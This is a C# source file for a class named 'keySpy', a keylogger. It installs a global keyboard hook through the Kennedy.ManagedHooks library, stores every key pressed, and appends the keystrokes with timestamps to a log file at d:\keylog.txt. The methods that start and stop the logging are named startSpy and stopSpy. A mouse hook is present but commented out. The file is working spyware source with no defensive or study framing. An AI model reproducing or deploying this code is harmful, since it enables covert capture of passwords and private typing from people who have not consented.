using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using Microsoft.Win32;
using System.IO;

namespace MK2_S
{
    public class keySpy
    {
        static List<String> keyLogCol = new List<String>();

        //private Kennedy.ManagedHooks.MouseHook mouseHook = null;
        private Kennedy.ManagedHooks.KeyboardHook keyboardHook = null;

        public keySpy()
        {
            //mouseHook = new Kennedy.ManagedHooks.MouseHook();
            //mouseHook.MouseEvent += new Kennedy.ManagedHooks.MouseHook.MouseEventHandler(mouseHook_MouseEvent);

            keyboardHook = new Kennedy.ManagedHooks.KeyboardHook();
            keyboardHook.KeyboardEvent += new Kennedy.ManagedHooks.KeyboardHook.KeyboardEventHandler(keyboardHook_KeyboardEvent);
        }

        private void mouseHook_MouseEvent(Kennedy.ManagedHooks.MouseEvents mEvent, Point point)
        {
            string msg = string.Format("Mouse: {0}: ({1},{2}).", mEvent.ToString(), point.X, point.Y);
            AddText(msg);
        }

        // EXAMPLE CODE SECTION
        private void keyboardHook_KeyboardEvent(Kennedy.ManagedHooks.KeyboardEvents kEvent, Keys key)
        {
            string msg = string.Format("{0}",key);
            AddText(msg);
        }

        public void buildLog()
        {
            FileStream fs = new FileStream(@"d:\keylog.txt", FileMode.OpenOrCreate, FileAccess.Write);
            StreamWriter sw = new StreamWriter(fs);
            sw.BaseStream.Seek(0, SeekOrigin.End);
            sw.WriteLine("[" + DateTime.Now.ToString() + "]");//Write LINE LINE
            sw.Flush();
            foreach(String str in keyLogCol)
            {
                sw.Write("[" + str + "] ");
                sw.Flush();
            }
            
            sw.Close();
            fs.Close();
            keyLogCol.Clear();
        }

        private void AddText(string message)
        {
            if (message == null)
            {
                return;
            }

            keyLogCol.Add(message);

            //int length = textBoxMessages.Text.Length + message.Length;
            //if (length >= textBoxMessages.MaxLength)
            //{
            //    textBoxMessages.Text = "";
            //}

            //if (!message.EndsWith("\r\n"))
            //{
            //    message += "\r\n";
            //}

            //textBoxMessages.Text = message + textBoxMessages.Text;
        }

        private void hookStart()
        {
            //AddText("Adding mouse hook.");
            //mouseHook.InstallHook();

            AddText("Adding keyboard hook.");
            keyboardHook.InstallHook();
        }

        public void hookStop()
        {
            //mouseHook.UninstallHook();
            //AddText("Mouse hook removed.");

            keyboardHook.UninstallHook();
            AddText("Keyboard hook removed.");
        }

        public void startSpy()
        {
            hookStart();
        }

        public void stopSpy()
        {
            hookStop();
        }

    }
}
